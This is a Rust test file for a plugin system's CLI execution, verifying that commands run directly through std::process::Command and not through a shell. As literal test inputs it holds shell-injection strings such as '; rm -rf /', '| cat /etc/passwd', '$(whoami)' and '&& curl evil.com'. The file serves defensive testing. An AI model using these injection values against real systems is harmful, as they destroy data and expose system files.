#![cfg(feature = "plugins-wasm")]

//! Test: Process spawned via std::process::Command (no shell).
//!
//! Task US-ZCL-55-2: Verifies acceptance criterion for US-ZCL-55:
//! > Process spawned via std::process::Command (no shell)
//!
//! This test verifies that CLI execution in the plugin system:
//! 1. Uses `std::process::Command::new()` directly, not via a shell
//! 2. Passes arguments via `.args()`, not as a single shell command string
//! 3. Does NOT use `sh -c`, `bash -c`, or similar shell wrappers
//!
//! The security benefit: shell metacharacters in arguments are passed literally
//! to the command, preventing shell injection attacks even if metacharacter
//! validation were bypassed.

use std::collections::HashMap;
use zeroclaw::plugins::CliCapability;
use zeroclaw::plugins::host_functions::{CliExecRequest, CliExecResponse};

// ---------------------------------------------------------------------------
// Core acceptance criterion: process spawned without shell interpretation
// ---------------------------------------------------------------------------

/// AC: CliExecRequest specifies command and args separately.
///
/// This design ensures direct execution via `Command::new(cmd).args(args)`
/// rather than shell interpretation via `sh -c "cmd args"`.
#[test]
fn request_separates_command_and_args() {
    let request = CliExecRequest {
        command: "echo".to_string(),
        args: vec!["hello".to_string(), "world".to_string()],
        working_dir: None,
        env: None,
    };

    // Command and args are separate fields - not a single shell command string
    assert_eq!(request.command, "echo");
    assert_eq!(request.args, vec!["hello", "world"]);

    // No way to embed shell commands in the command field
    assert!(!request.command.contains(' '));
}

/// AC: Request format does NOT support shell command strings.
///
/// Unlike shell execution `sh -c "echo hello && rm -rf /"`, our format
/// requires the command and each argument to be separate elements.
#[test]
fn request_format_prevents_shell_command_strings() {
    // This is what a shell-based API might accept (dangerous):
    // shell_execute("echo hello && rm -rf /")
    //
    // Our API requires explicit separation (safe):
    let request = CliExecRequest {
        command: "echo".to_string(),
        args: vec!["hello && rm -rf /".to_string()], // This is a LITERAL string argument
        working_dir: None,
        env: None,
    };

    // The entire "hello && rm -rf /" is ONE argument to echo
    // With std::process::Command, echo receives: ["hello && rm -rf /"]
    // With shell execution, it would run: echo hello, then rm -rf /
    assert_eq!(request.args.len(), 1);
    assert_eq!(request.args[0], "hello && rm -rf /");
}

/// AC: Arguments with shell metacharacters are treated as literal strings.
///
/// When using std::process::Command::args(), these are passed literally
/// to the spawned process, not interpreted by a shell.
#[test]
fn args_with_metacharacters_are_literal() {
    let request = CliExecRequest {
        command: "printf".to_string(),
        args: vec![
            "%s".to_string(),
            "$(whoami)".to_string(), // Literal string, NOT command substitution
        ],
        working_dir: None,
        env: None,
    };

    // With std::process::Command: printf receives ["$(whoami)"] literally
    // With shell: printf would receive the output of `whoami` command
    assert!(request.args[1].starts_with("$("));
    assert!(request.args[1].ends_with(")"));
}

/// AC: Multiple arguments preserve their boundaries.
///
/// With direct Command::args(), each element is a separate argv entry.
/// Shell execution would require quoting to preserve boundaries.
#[test]
fn multiple_args_preserve_boundaries() {
    let request = CliExecRequest {
        command: "ls".to_string(),
        args: vec![
            "file with spaces.txt".to_string(),
            "another file.txt".to_string(),
        ],
        working_dir: None,
        env: None,
    };

    // With std::process::Command: ls receives argv[1]="file with spaces.txt", argv[2]="another file.txt"
    // With shell: ls would see multiple arguments split on whitespace without proper quoting
    assert_eq!(request.args.len(), 2);
    assert!(request.args[0].contains(' '));
    assert!(request.args[1].contains(' '));
}

// ---------------------------------------------------------------------------
// JSON serialization preserves direct execution semantics
// ---------------------------------------------------------------------------

/// AC: CliExecRequest JSON maintains command/args separation.
#[test]
fn json_request_maintains_separation() {
    let request = CliExecRequest {
        command: "git".to_string(),
        args: vec!["log".to_string(), "--oneline".to_string(), "-5".to_string()],
        working_dir: None,
        env: None,
    };

    let json = serde_json::to_string(&request).expect("serialization must succeed");

    // Verify JSON structure maintains separation
    let parsed: serde_json::Value = serde_json::from_str(&json).expect("valid JSON");

    assert!(parsed["command"].is_string());
    assert!(parsed["args"].is_array());
    assert_eq!(parsed["args"].as_array().unwrap().len(), 3);
}

/// AC: CliExecRequest roundtrips without shell interpretation artifacts.
#[test]
fn request_roundtrip_preserves_literal_args() {
    let original = CliExecRequest {
        command: "echo".to_string(),
        args: vec![
            "$HOME".to_string(),         // Literal dollar sign
            "`id`".to_string(),          // Literal backticks
            "a;b".to_string(),           // Literal semicolon
            "x|y".to_string(),           // Literal pipe
            "foo > bar".to_string(),     // Literal redirect
            "test && test2".to_string(), // Literal AND
        ],
        working_dir: None,
        env: None,
    };

    let json = serde_json::to_string(&original).expect("serialize");
    let restored: CliExecRequest = serde_json::from_str(&json).expect("deserialize");

    // All literal characters must be preserved exactly
    assert_eq!(original.args, restored.args);
    assert_eq!(restored.args[0], "$HOME");
    assert_eq!(restored.args[1], "`id`");
    assert_eq!(restored.args[2], "a;b");
    assert_eq!(restored.args[3], "x|y");
    assert_eq!(restored.args[4], "foo > bar");
    assert_eq!(restored.args[5], "test && test2");
}

// ---------------------------------------------------------------------------
// Response structure supports direct execution model
// ---------------------------------------------------------------------------

/// AC: CliExecResponse captures exact process output, not shell-interpreted output.
#[test]
fn response_captures_exact_process_output() {
    // When a process outputs literal shell metacharacters,
    // they should be captured exactly as-is
    let response = CliExecResponse {
        stdout: "Result: $VAR is $(cmd) and `backtick`\n".to_string(),
        stderr: String::new(),
        exit_code: 0,
        truncated: false,
        timed_out: false,
    };

    // Output should contain literal characters, not shell expansions
    assert!(response.stdout.contains("$VAR"));
    assert!(response.stdout.contains("$(cmd)"));
    assert!(response.stdout.contains("`backtick`"));
}

/// AC: Exit code comes directly from process, not shell wrapper.
#[test]
fn exit_code_from_direct_process() {
    // Direct execution means exit_code is from the actual command
    // Shell wrapper would mask or transform exit codes
    let response = CliExecResponse {
        stdout: String::new(),
        stderr: String::new(),
        exit_code: 42, // Arbitrary exit code from command
        truncated: false,
        timed_out: false,
    };

    // Exit code 42 should be preserved exactly
    // (shell wrappers might cap at 255 or transform)
    assert_eq!(response.exit_code, 42);
}

// ---------------------------------------------------------------------------
// CliCapability configuration supports direct execution
// ---------------------------------------------------------------------------

/// AC: allowed_commands contains command names, not shell command strings.
#[test]
fn allowed_commands_are_command_names_not_shell_strings() {
    let cap = CliCapability {
        allowed_commands: vec!["git".to_string(), "npm".to_string(), "cargo".to_string()],
        ..Default::default()
    };

    // Commands are simple names that resolve via `which`
    for cmd in &cap.allowed_commands {
        assert!(
            !cmd.contains(' '),
            "command name should not contain spaces: {}",
            cmd
        );
        assert!(
            !cmd.contains(';'),
            "command name should not contain semicolons: {}",
            cmd
        );
        assert!(
            !cmd.contains('|'),
            "command name should not contain pipes: {}",
            cmd
        );
    }
}

/// AC: allowed_args patterns work with individual arguments, not shell strings.
#[test]
fn allowed_args_patterns_match_individual_args() {
    use zeroclaw::plugins::ArgPattern;

    let cap = CliCapability {
        allowed_commands: vec!["git".to_string()],
        allowed_args: vec![ArgPattern::new(
            "git",
            vec![r"^(status|log|diff)$".to_string()],
        )],
        ..Default::default()
    };

    // Patterns are applied to individual args, not a combined shell string
    let git_pattern = &cap.allowed_args[0];
    assert_eq!(git_pattern.command, "git");
    assert!(!git_pattern.patterns.is_empty());

    // Pattern matches single words, reflecting argv-style argument passing
    let pattern = &git_pattern.patterns[0];
    assert!(pattern.contains("status"));
    assert!(!pattern.contains("status log")); // Not matching combined string
}

// ---------------------------------------------------------------------------
// Architecture verification: no shell wrapper patterns
// ---------------------------------------------------------------------------

/// AC: Request does not include shell wrapper command (sh, bash, etc.).
#[test]
fn request_does_not_use_shell_wrapper_pattern() {
    // This test documents that we DON'T use the shell wrapper pattern:
    // BAD:  Command::new("sh").args(["-c", "echo hello"])
    // GOOD: Command::new("echo").args(["hello"])

    let request = CliExecRequest {
        command: "echo".to_string(),
        args: vec!["hello".to_string()],
        working_dir: None,
        env: None,
    };

    // Command is "echo", not "sh" or "bash"
    assert_ne!(request.command, "sh");
    assert_ne!(request.command, "bash");
    assert_ne!(request.command, "/bin/sh");
    assert_ne!(request.command, "/bin/bash");

    // Args don't start with "-c" (shell eval flag)
    if !request.args.is_empty() {
        assert_ne!(request.args[0], "-c");
    }
}

/// AC: Working directory is passed via Command::current_dir, not shell cd.
#[test]
fn working_dir_is_command_api_not_shell_cd() {
    let request = CliExecRequest {
        command: "ls".to_string(),
        args: vec!["-la".to_string()],
        working_dir: Some("/tmp".to_string()),
        env: None,
    };

    // Working dir is a separate field, not embedded in command/args
    // Shell pattern would be: "cd /tmp && ls -la"
    // Our pattern: Command::new("ls").args(["-la"]).current_dir("/tmp")
    assert_eq!(request.working_dir, Some("/tmp".to_string()));
    assert!(!request.command.contains("cd"));
    assert!(!request.args.iter().any(|a| a.starts_with("cd ")));
}

/// AC: Environment is passed via Command::env, not shell export.
#[test]
fn env_is_command_api_not_shell_export() {
    let mut env = HashMap::new();
    env.insert("MY_VAR".to_string(), "my_value".to_string());

    let request = CliExecRequest {
        command: "printenv".to_string(),
        args: vec!["MY_VAR".to_string()],
        working_dir: None,
        env: Some(env),
    };

    // Env is a separate field, not embedded in command
    // Shell pattern would be: "export MY_VAR=my_value && printenv MY_VAR"
    // Our pattern: Command::new("printenv").args(["MY_VAR"]).env("MY_VAR", "my_value")
    assert!(request.env.is_some());
    assert!(!request.command.contains("export"));
    assert!(!request.args.iter().any(|a| a.contains("export")));
}

// ---------------------------------------------------------------------------
// Defense in depth: combined with metacharacter blocking
// ---------------------------------------------------------------------------

/// AC: Even if metachar validation bypassed, direct execution prevents injection.
///
/// This is defense in depth: the primary defense is metacharacter blocking,
/// but direct execution provides a secondary defense layer.
#[test]
fn direct_execution_is_defense_in_depth() {
    // Hypothetical bypass: what if a metacharacter somehow got through validation?
    let request = CliExecRequest {
        command: "echo".to_string(),
        args: vec!["; rm -rf /".to_string()], // Hypothetical bypass of validation
        working_dir: None,
        env: None,
    };

    // With std::process::Command:
    //   - echo receives ONE argument: "; rm -rf /"
    //   - Output: "; rm -rf /"
    //   - rm is NEVER executed
    //
    // With shell execution:
    //   - sh -c "echo ; rm -rf /"
    //   - Outputs empty line
    //   - rm IS executed!

    // The API structure itself prevents the attack
    assert_eq!(request.args.len(), 1);
    assert!(request.args[0].starts_with(';'));
}

/// AC: Direct execution complements metachar blocking for comprehensive security.
#[test]
fn direct_execution_and_metachar_blocking_are_complementary() {
    // Layer 1: Metacharacter blocking (prevents dangerous input from reaching Command)
    // Layer 2: Direct execution (even if dangerous input reaches Command, no shell interprets it)

    // Both layers protect against the same attack vector, providing defense in depth
    let dangerous_args = vec![
        "; rm -rf /",
        "| cat /etc/passwd",
        "$(whoami)",
        "`id`",
        "&& curl evil.com",
        "> /etc/passwd",
    ];

    for dangerous_arg in dangerous_args {
        let request = CliExecRequest {
            command: "echo".to_string(),
            args: vec![dangerous_arg.to_string()],
            working_dir: None,
            env: None,
        };

        // With direct execution, these are just strings passed to echo
        assert_eq!(request.args[0], dangerous_arg);
    }
}
